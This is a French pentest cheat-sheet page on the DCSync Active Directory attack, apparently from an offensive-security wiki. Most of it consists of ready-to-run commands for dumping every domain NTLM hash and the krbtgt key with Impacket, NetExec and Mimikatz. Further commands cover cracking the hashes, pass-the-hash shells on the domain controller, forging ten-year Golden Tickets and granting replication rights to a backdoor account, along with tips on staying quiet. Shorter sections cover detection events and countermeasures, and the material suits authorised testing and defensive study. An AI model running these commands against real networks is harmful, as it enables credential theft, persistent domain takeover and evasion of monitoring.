# DCSync

DCSync est une technique d'attaque Active Directory qui exploite le mécanisme de réplication des contrôleurs de domaine. Elle permet à un attaquant possédant les droits de réplication AD d'imiter un contrôleur de domaine et de demander les hashes NTLM de tous les comptes du domaine y compris le compte krbtgt et Administrator sans accéder physiquement au DC.

## Mécanisme
```
[Attaquant] → DsGetNCChanges() → [DC]
             (simule un DC secondaire)
[DC]        → Réplication des hashes → [Attaquant]
```

Le protocole MS-DRSR (Directory Replication Service Remote Protocol) est utilisé par les DC pour se synchroniser entre eux. Un compte possédant les droits de réplication peut déclencher cette synchronisation et recevoir les données dont les hashes NTLM.

### Droits requis

| Droit | Description |
|---|---|
| `Replicating Directory Changes` | Droit de base pour la réplication |
| `Replicating Directory Changes All` | Réplication de tous les attributs (hashes) |
| `Replicating Directory Changes in Filtered Set` | Réplication filtrée |

Ces droits sont attribués par défaut aux groupes :
- Domain Admins
- Enterprise Admins
- Administrators
- Domain Controllers

## Prérequis

| Élément | Détail |
|---|---|
| Accès requis | Compte avec droits de réplication AD |
| Position réseau | Accès au DC sur les ports 135, 389, 445 |
| Outils nécessaires | Impacket / Mimikatz / NetExec |

## Quick Attack

::: code-group
```bash [Impacket — tous les hashes]
impacket-secretsdump domain.com/user:password@<DC> -just-dc-ntlm
```
```bash [Impacket — compte spécifique]
impacket-secretsdump domain.com/user:password@<DC> -just-dc-user Administrator
```
```bash [NetExec]
nxc smb <DC> -u user -p password --ntds
```
```bash [Mimikatz — Windows]
lsadump::dcsync /domain:domain.com /user:Administrator
```

:::

## Workflow
```
1. Identifier les comptes avec droits de réplication
2. Valider les droits (BloodHound / LDAP)
3. Exécuter DCSync depuis Linux ou Windows
4. Extraire les hashes prioritaires (Administrator, krbtgt)
5. Cracker ou utiliser les hashes directement (PtH)
6. Etablir la persistance (Golden Ticket)
```

## Identifier les Droits de Réplication


### Via LDAP
```bash
# Vérifier les ACL sur l'objet domaine
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" \
  "(objectClass=domain)" nTSecurityDescriptor

# Via Impacket dacledit
impacket-dacledit domain.com/user:password@<DC> \
  -action read \
  -target-dn "DC=domain,DC=com" \
  -principal compromised_user
```

### Via PowerView (Windows)
```powershell
# Vérifier les droits de réplication sur le domaine
Get-DomainObjectAcl "DC=domain,DC=com" -ResolveGUIDs | \
  Where-Object {$_.ObjectAceType -match "DS-Replication"}

# Comptes avec droits de réplication
Get-DomainObjectAcl "DC=domain,DC=com" -ResolveGUIDs | \
  Where-Object {
    $_.ObjectAceType -match "DS-Replication-Get-Changes"
  } | \
  Select-Object SecurityIdentifier, ObjectAceType
```

## Exploitation

### Via Impacket — secretsdump
```bash
# Dump complet — tous les hashes NTLM
impacket-secretsdump domain.com/user:password@<DC> -just-dc-ntlm

# Dump complet avec Kerberos keys
impacket-secretsdump domain.com/user:password@<DC> -just-dc

# Compte spécifique
impacket-secretsdump domain.com/user:password@<DC> \
  -just-dc-user Administrator

impacket-secretsdump domain.com/user:password@<DC> \
  -just-dc-user krbtgt

# Avec hash NTLM — Pass-the-Hash
impacket-secretsdump domain.com/user@<DC> \
  -hashes :NTLMhash -just-dc-ntlm

# Avec ticket Kerberos
export KRB5CCNAME=ticket.ccache
impacket-secretsdump domain.com/user@<DC> \
  -k -no-pass -just-dc-ntlm

# Sauvegarder le dump
impacket-secretsdump domain.com/user:password@<DC> \
  -just-dc-ntlm -outputfile /tmp/domain_hashes
```

### Via NetExec
```bash
# Dump NTDS via DCSync
nxc smb <DC> -u user -p password --ntds

# Compte spécifique
nxc smb <DC> -u user -p password --ntds --ntds-pwdLastSet

# Avec hash NTLM
nxc smb <DC> -u user -H NTLMhash --ntds

# Sauvegarder
nxc smb <DC> -u user -p password --ntds | tee /tmp/ntds_dump.txt
```

### Via Mimikatz (Windows)
```bash
# Compte spécifique
lsadump::dcsync /domain:domain.com /user:Administrator
lsadump::dcsync /domain:domain.com /user:krbtgt

# Tous les comptes
lsadump::dcsync /domain:domain.com /all

# Export CSV
lsadump::dcsync /domain:domain.com /all /csv

# Compte machine DC
lsadump::dcsync /domain:domain.com /user:DC$
```

### Via PowerShell (Windows)
```powershell
# Via DSInternals
Install-Module DSInternals
Get-ADReplAccount -SamAccountName Administrator -Server <DC> -Domain domain.com

# Tous les comptes
Get-ADReplAccount -All -Server <DC> -Domain domain.com
```

## Comptes Prioritaires à Dumper
```bash
# 1. krbtgt — Golden Ticket
impacket-secretsdump domain.com/user:password@<DC> -just-dc-user krbtgt

# 2. Administrator du domaine
impacket-secretsdump domain.com/user:password@<DC> -just-dc-user Administrator

# 3. Tous les Domain Admins
impacket-secretsdump domain.com/user:password@<DC> -just-dc-ntlm | \
  grep -i "admin\|da\|ea"

# 4. Comptes de service avec SPN
impacket-secretsdump domain.com/user:password@<DC> -just-dc-ntlm | \
  grep -i "svc\|service\|sql\|iis\|exchange"
```

## Format des Hashes dumpés
```
# Format secretsdump
domain\username:RID:LMhash:NThash:::

# Exemple
domain.com\Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
domain.com\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a3c1f45e4b2c7f8d9e0a1b2c3d4e5f6a:::

# Extraction du NThash uniquement
cat hashes.txt | cut -d: -f4
```

## Exploitation des Hashes

### Pass-the-Hash avec les hashes dumpés
```bash
# Valider le hash Administrator
nxc smb 192.168.1.0/24 -u Administrator -H <NThash>

# Accès à toutes les machines du domaine
nxc smb 192.168.1.0/24 -u Administrator -H <NThash> -x "whoami"

# Shell sur le DC
impacket-psexec domain.com/Administrator@<DC> -hashes :NThash
impacket-wmiexec domain.com/Administrator@<DC> -hashes :NThash
evil-winrm -i <DC> -u Administrator -H NThash
```

### Golden Ticket avec le hash krbtgt
```bash
# Récupérer le SID du domaine
impacket-getPac domain.com/user:password -targetUser Administrator

# Créer le Golden Ticket
impacket-ticketer \
  -nthash <KRBTGT_HASH> \
  -domain-sid <DOMAIN_SID> \
  -domain domain.com \
  Administrator

# Utiliser le Golden Ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec domain.com/Administrator@<DC> -k -no-pass
impacket-secretsdump domain.com/Administrator@<DC> -k -no-pass -just-dc-ntlm
```

### Crack des hashes
```bash
# Hashcat — NTLM mode 1000
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Avec règles
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# John
john hashes.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
```

## Obtenir les Droits DCSync

Si le compte compromis n'a pas encore les droits de réplication :

### Via WriteDACL / GenericAll sur le domaine
```bash
# Ajouter les droits DCSync à un compte backdoor
impacket-dacledit domain.com/DA_user:password@<DC> \
  -action write \
  -rights DCSync \
  -target-dn "DC=domain,DC=com" \
  -principal backdoor_user

# Via PowerView (Windows)
Add-DomainObjectAcl \
  -TargetIdentity "DC=domain,DC=com" \
  -PrincipalIdentity backdoor_user \
  -Rights DCSync

# Vérifier
Get-DomainObjectAcl "DC=domain,DC=com" -ResolveGUIDs | \
  Where-Object {$_.SecurityIdentifier -match "backdoor_user"}
```

## Persistance via DCSync
```bash
# 1. Dump du hash krbtgt — Golden Ticket
impacket-secretsdump domain.com/Administrator:password@<DC> -just-dc-user krbtgt

# 2. Récupérer le SID du domaine
impacket-secretsdump domain.com/Administrator:password@<DC> \
  -just-dc-user Administrator | grep -i "sid"

# 3. Créer un Golden Ticket valable 10 ans
impacket-ticketer \
  -nthash <KRBTGT_HASH> \
  -domain-sid <DOMAIN_SID> \
  -domain domain.com \
  -duration 87600 \
  Administrator

# 4. Ajouter des droits DCSync à un compte backdoor
impacket-dacledit domain.com/Administrator:password@<DC> \
  -action write \
  -rights DCSync \
  -target-dn "DC=domain,DC=com" \
  -principal backdoor_user
```

## Détection & IOC

### Event IDs Windows

| Event ID | Description | Contexte |
|---|---|---|
| 4662 | Accès objet AD avec droits étendus | DCSync génère cet event |
| 4624 | Logon réseau Type 3 | Connexion depuis l'attaquant |
| 4742 | Compte machine modifié | Si compte DC impersonné |

### Indicateurs de compromission

- Event 4662 avec `Properties: {1131f6aa...}` ou `{1131f6ad...}` (GUID réplication)
- Requêtes de réplication depuis une IP qui n'est pas un DC
- Multiples demandes de réplication en peu de temps
- Compte non DC accédant aux objets de réplication

### Détection via script
```bash
# Chercher les events DCSync dans les logs Windows
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 4662
} | Where-Object {
    $_.Message -match "1131f6aa|1131f6ad|89e95b76"
} | Select-Object TimeCreated, Message
```

## Contre-mesures

- Auditer régulièrement les comptes avec droits `Replicating Directory Changes`
- Limiter ces droits aux seuls DC et comptes d'administration légitimes
- Monitorer l'Event ID **4662** avec les GUIDs de réplication
- Implémenter une solution SIEM avec alerte sur les réplications depuis des IPs non DC
- Utiliser **Microsoft Defender for Identity** détecte nativement DCSync
- Appliquer le **principe du moindre privilège** sur les comptes AD
- Effectuer un **double reset du compte krbtgt** si compromission suspectée

## Points d'attaque

- Comptes avec droits de réplication non justifiés
- WriteDACL / GenericAll sur l'objet domaine permettant d'ajouter les droits
- Absence de monitoring sur les Event ID 4662
- Comptes de service avec droits de réplication hérités
- Délégations mal configurées donnant accès aux droits de réplication

::: info Tips 

- DCSync est l'une des techniques les plus **silencieuses** pour dumper les hashes pas de connexion directe au DC nécessaire
- Prioriser le dump du **hash krbtgt** il permet de créer un Golden Ticket valable 10 ans
- L'Event ID **4662** avec les GUIDs de réplication est le seul indicateur fiable de DCSync vérifier si le SIEM est configuré
- Utiliser `impacket-secretsdump` avec `-just-dc-user krbtgt` avant le dump complet plus rapide et moins bruyant
- Le **Golden Ticket** créé avec le hash krbtgt reste valide même après reset du mot de passe administrateur
- Si les droits DCSync ne sont pas disponibles, vérifier si le compte a **WriteDACL ou GenericAll** sur l'objet domaine via BloodHound
- DCSync depuis Linux via Impacket est plus discret que depuis Windows via Mimikatz pas de binaire à déposer

:::

::: details Checklist

- Droits de réplication vérifiés (BloodHound / LDAP)
- Hash krbtgt dumpé
- Hash Administrator dumpé
- Tous les hashes du domaine dumpés
- Hash krbtgt utilisé pour Golden Ticket
- Hashes prioritaires crackés
- Pass-the-Hash effectué sur les machines cibles
- Droits DCSync ajoutés à un compte backdoor si possible
- IOC documentés

:::

## Tools

- [Impacket secretsdump](https://github.com/SecureAuthCorp/impacket)
- [NetExec (NXC)](https://github.com/Pennyw0rth/NetExec)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [PowerView](https://github.com/PowerShellMafia/PowerSploit)
- [DSInternals](https://github.com/MichaelGrafnetter/DSInternals)
- [Hashcat](https://hashcat.net/hashcat/)

## Ressources

- [HackTricks DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
- [The Hacker Recipes DCSync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync)
- [PayloadsAllTheThings DCSync](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#dcsync)
- [adsecurity.org DCSync](https://adsecurity.org/?p=1729)
- [Microsoft MS-DRSR Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/)

## Notes
```
 # Notes terrain
```



<div class="page-footer">

<span>![Last updated](https://img.shields.io/github/last-commit/Hackthus/The-Hackers-237?label=Last%20updated&style=flat-square&color=gray)</span>

<span>[![Edit this page on GitHub](https://img.shields.io/badge/✏️%20Edit%20this%20page-GitHub-black?style=flat-square&logo=github)](https://github.com/Hackthus/The-Hackers-237/edit/main/docs/ad/dcsync.md)</span>

</div>